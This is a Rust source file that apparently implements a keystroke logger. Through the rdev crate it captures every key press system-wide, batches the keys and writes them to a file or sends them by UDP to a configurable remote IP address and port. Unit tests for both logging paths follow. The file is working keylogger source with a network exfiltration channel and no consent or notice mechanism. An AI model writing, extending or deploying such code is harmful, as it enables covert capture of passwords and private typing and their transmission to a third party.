use rdev::{listen, Event, EventType};
use std::io::Write;
use std::net::IpAddr;
use std::sync::{Arc, Mutex};

pub trait Log: Send + Sync {
    fn log(&self, data: &str) -> Result<(), Box<dyn std::error::Error>>;
}

pub struct NetworkLogger {
    pub ipv4_addr: IpAddr,
    pub port: u16,
    socket: std::net::UdpSocket,
}

impl NetworkLogger {
    pub fn new(ipv4_addr: IpAddr, port: u16) -> Result<Self, std::io::Error> {
        Ok(Self {
            ipv4_addr,
            port,
            socket: std::net::UdpSocket::bind(format!("{}:{}", ipv4_addr, 0))?,
        })
    }
}

impl Log for NetworkLogger {
    fn log(&self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
        self.socket
            .send_to(data.as_bytes(), (self.ipv4_addr, self.port))?;
        Ok(())
    }
}

pub struct FileLogger {
    pub recorder_file: std::path::PathBuf,
}

impl FileLogger {
    pub fn new(recorder_file: std::path::PathBuf) -> Self {
        Self { recorder_file }
    }
}

impl Log for FileLogger {
    fn log(&self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
        let mut file = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.recorder_file)?;
        write!(file, "{}", data)?;
        Ok(())
    }
}

pub fn run(logger: Box<dyn Log>, keystroke_threshold: u32) {
    // Create a shared, thread-safe logger and key buffer instance
    let logger = Arc::new(Mutex::new(logger));
    let key_buffer = Arc::new(Mutex::new(Vec::new()));

    // Create the event listener with a closure that captures the logger
    let listener = move |event: Event| {
        if let EventType::KeyPress(key) = event.event_type {
            if let Ok(mut buffer) = key_buffer.lock() {
                buffer.push(format!("{:?}\n", key));
                if buffer.len() >= keystroke_threshold as usize {
                    if let Ok(logger) = logger.lock() {
                        if let Err(e) = logger.log(&buffer.join("")) {
                            eprintln!("error: {}", e);
                            std::process::exit(1);
                        }
                    }
                    buffer.clear();
                }
            }
        }
    };

    if let Err(e) = listen(listener) {
        eprintln!("error: failed to listen for keyboard event {:?}", e);
        std::process::exit(1);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs::File;
    use std::net::UdpSocket;
    use testdir::testdir;

    #[test]
    fn file_logger_writes_data_to_file() {
        let dir = testdir!();
        let log_path = dir.join("test.log");
        let logger = FileLogger::new(log_path.clone());

        logger.log("test data\n").unwrap();

        let contents = std::fs::read_to_string(log_path).unwrap();
        assert_eq!(contents, "test data\n");
    }

    #[test]
    fn file_logger_appends_multiple_writes() {
        let dir = testdir!();
        let log_path = dir.join("test.log");
        let logger = FileLogger::new(log_path.clone());

        logger.log("first line\n").unwrap();
        logger.log("second line\n").unwrap();

        let contents = std::fs::read_to_string(log_path).unwrap();
        assert_eq!(contents, "first line\nsecond line\n");
    }

    #[test]
    fn file_logger_appends_to_existing_file() {
        let dir = testdir!();
        let log_path = dir.join("test.log");

        // Create file with initial content
        let mut file = File::create(&log_path).unwrap();
        file.write_all(b"existing content\n").unwrap();

        let logger = FileLogger::new(log_path.clone());
        logger.log("new content\n").unwrap();

        let contents = std::fs::read_to_string(log_path).unwrap();
        assert_eq!(contents, "existing content\nnew content\n");
    }

    #[test]
    fn network_logger_sends_data_to_socket() {
        // Set up a receiver first
        let receiver = UdpSocket::bind("127.0.0.1:0").unwrap();
        let receiver_port = receiver.local_addr().unwrap().port();

        // Create the logger pointing to our receiver
        let logger = NetworkLogger::new("127.0.0.1".parse().unwrap(), receiver_port).unwrap();

        // Send some test data
        logger.log("test data").unwrap();

        // Receive the data
        let mut buf = [0; 1024];
        let (size, _) = receiver.recv_from(&mut buf).unwrap();
        let received = std::str::from_utf8(&buf[..size]).unwrap();

        assert_eq!(received, "test data");
    }

    #[test]
    fn network_logger_handles_multiple_sends() {
        let receiver = UdpSocket::bind("127.0.0.1:0").unwrap();
        let receiver_port = receiver.local_addr().unwrap().port();

        let logger = NetworkLogger::new("127.0.0.1".parse().unwrap(), receiver_port).unwrap();

        logger.log("first").unwrap();
        logger.log("second").unwrap();

        let mut buf = [0; 1024];
        let (size, _) = receiver.recv_from(&mut buf).unwrap();
        assert_eq!(std::str::from_utf8(&buf[..size]).unwrap(), "first");

        let (size, _) = receiver.recv_from(&mut buf).unwrap();
        assert_eq!(std::str::from_utf8(&buf[..size]).unwrap(), "second");
    }
}
